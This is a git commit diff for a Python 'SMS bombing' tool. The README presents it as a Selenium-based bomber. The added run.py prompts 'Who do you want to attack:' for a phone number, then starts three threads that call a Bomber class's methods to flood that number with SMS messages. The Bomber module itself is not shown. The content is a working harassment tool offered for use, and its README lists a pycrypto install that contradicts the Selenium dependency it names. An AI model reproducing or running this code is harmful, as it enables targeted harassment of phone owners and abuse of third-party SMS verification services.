41c3ff49a236773360fff8ecd0d9a4ea6dc4cb6c
zhangwudia <z854062024@163.com>
2019-03-09 00:24:30 +0800

    zhangwudi

--- README.md
+++ README.md
@@ -1,2 +1,16 @@
-# SMS-booming
-短信轰炸
+# SMS-bombing
+## 简介
+
+<br /> 基于Python3_短信轰炸
+<br /> 不要泛滥哦嘤嘤嘤
+<br /> 来自java的版本，C++java的版本和Python版本的原理相同，只是用了selenium库，速度比java更快。
+<br /> 有兴趣可以试试做个PHP版本，毕竟是世界上最好的语言，可能比Python快多了（逃
+<br /> 目前有两个运行py文件，一个为单线程任务，一个为多线程任务（run.py），但我都没有写成无限循环。
+
+## 依赖 selenium库 
+
+```
+pip(3) install pycrypto
+```
+
+## 嘤嘤嘤
---
+++ run.py
@@ -0,0 +1,57 @@
+# encoding=utf-8
+# attack.py
+from smsbomber import Bomber
+import threading
+
+def attack1(phone):
+    func = ['func%d' %i for i in range(0,10)]
+    for i in func:
+        if hasattr(Bomber,i):
+            try:
+                getattr(Bomber(phone),i)()
+                print('%s has excuted!' %i)
+            except:
+                print('%s meet some problems!' %i)
+                continue
+        else:
+            print('There is not %s' %i)
+
+def attack2(phone):
+    func = ['func%d' %i for i in range(5,15)]
+    for i in func:
+        if hasattr(Bomber,i):
+            try:
+                getattr(Bomber(phone),i)()
+                print('%s has excuted!' %i)
+            except:
+                print('%s meet some problems!' %i)
+                continue
+        else:
+            print('There is not %s' %i)
+
+def attack3(phone):
+    func = ['func%d' %i for i in range(10,20)]
+    for i in func:
+        if hasattr(Bomber,i):
+            try:
+                getattr(Bomber(phone),i)()
+                print ('%s has excuted!' %i)
+            except:
+                print('%s meet some problems!' %i)
+                continue
+        else:
+            print('There is not %s' %i)
+
+phone = input('Who do you want to attack:').strip()
+# phone = '01234567890'
+thread1 = threading.Thread(target=attack1,name='thread1',args=(phone,))
+thread2 = threading.Thread(target=attack2,name='thread2',args=(phone,))
+thread3 = threading.Thread(target=attack3,name='thread3',args=(phone,))
+threading.current_thread().name
+thread1.start()
+thread2.start()
+thread3.start()
+thread1.join()
+thread2.join()
+thread3.join()
+print('已经轰炸完成!')
